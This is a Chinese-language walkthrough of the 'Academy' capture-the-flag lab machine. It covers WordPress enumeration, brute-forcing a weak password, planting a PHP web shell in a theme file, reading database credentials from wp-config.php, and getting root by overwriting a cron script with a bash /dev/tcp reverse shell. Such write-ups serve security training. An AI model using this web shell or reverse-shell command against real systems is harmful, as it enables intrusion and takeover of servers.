# Academy

2025.03.08 https://thehackerslabs.com/academy/

[video](https://www.bilibili.com/video/BV1Ed9XY9E4i/?spm_id_from=333.1387.collection.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

先将 academy.thl 添加到 hosts 文件中。

发现 wordpress : http://192.168.5.40/wordpress/ , wpscan 枚举到一个用户 dylan 和 一个插件 file-manager 6.5.1

简单爆破，发现用户的登陆密码: password1 进入到后台管理页面。点击左侧 Tools -> Theme File Editor -> 选择主题 twentytwentythree -> 编辑 patterns/hidden-404.php 植入 php shell：

```
<?php echo 1; system($_GET[1]);?>
```

进行验证:

```
curl -s 'http://192.168.5.40/wordpress/wp-content/themes/twentytwentythree/patterns/hidden-404.php?1=id'
1uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

可以执行，进行反弹 shell，先拿到了 wp-config.php 文件：

```
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpressuser' );
define( 'DB_PASSWORD', 't9sH76gpQ82UFeZ3GXZS' );
define( 'DB_HOST', 'localhost' );
```

枚举后只发现一个文件 /opt/backup.py 。

使用 pspy64 发现以 root 身份每分钟执行一次 /opt/backup.sh， www-data 对 /opt 目录有写权限，可以直接进行新建 backup.sh ：

```
echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"' > /opt/backup.sh
chmod +x /opt/backup.sh
```

在 kali 上监听 8888，过了 1 分钟得到了 root 反弹的 shell：

拿到 2 个 flag:

```
root@debian:/home/debian# cat user.txt
f3e431cd1129e9879e482fcb2cc151e8

root@debian:~# cat root.txt
39531504f0ddd4778a542fae02fe4733
```
